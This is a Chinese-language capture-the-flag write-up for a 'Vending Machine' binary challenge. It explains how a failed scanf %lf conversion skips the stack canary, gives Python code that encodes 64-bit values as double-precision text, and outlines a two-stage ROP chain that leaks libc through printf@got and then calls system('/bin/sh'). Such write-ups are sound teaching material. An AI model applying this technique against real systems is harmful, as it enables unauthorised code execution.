# Vending Machine

## 题目简述

程序只分配了 10 个 `double`，却允许输入 18 个价格，形成以 8 字节为步长的栈溢出。难点在于栈 canary 位于写入路径上：利用 `%lf` 转换失败时不改写目标内存的语义，可以跳过 canary，再用浮点数字符串写入任意 64 位 ROP 数据。

## 解题过程

漏洞循环如下：

```c
double drinks[10];
for (int i = 0; i < 18; i++) {
    scanf("%c", &resp);
    getchar();
    if (resp != 'Y') break;
    scanf("%lf", &drinks[i]);
    getchar();
}
```

反汇编确认第 12 个目标槽位对应 canary。先正常写入前 11 个槽位，到 canary 时提交单独的 `.`。它不是合法浮点数，`scanf` 返回 0 且不触碰 `drinks[i]`；随后的 `getchar()` 消耗这个字符，使协议还能继续。

其他槽位必须以十进制浮点文本提交。将目标 qword 按 IEEE 754 双精度位模式解释，再交给 `%lf` 解析即可保持原始 64 位：

```python
import struct

def qword_as_double_text(value):
    raw = struct.pack("<Q", value)
    return str(struct.unpack("<d", raw)[0]).encode()

def write_qword(value):
    io.sendlineafter(b"(Y/N) > ", b"Y")
    io.sendlineafter(b"price > ", qword_as_double_text(value))
```

第一阶段跳过 canary 后，覆盖保存的 `rbp`，再构造：

```text
pop rdi; ret
printf@got
ret
printf@plt
程序入口
```

`printf@got` 的六字节泄漏用于计算随题提供的 libc 基址；回到入口后重复一次 11 个填充槽位和无效浮点数跳过 canary，第二阶段写入 `pop rdi; ret`、`/bin/sh`、对齐用 `ret`、`system`。结束循环触发返回，得到：

```text
grey{Double, double toil and trouble; Fire burn and cauldron bubble...}
```

## 方法总结

本题把输入转换的失败语义变成了“保留原值”的写入空洞。面对带 canary 的非字节型溢出，应检查解析函数的返回值是否被忽略，以及失败输入是否仍会推进循环。把 qword 重新解释成浮点数时则必须保持位模式，而不是进行数值类型转换。
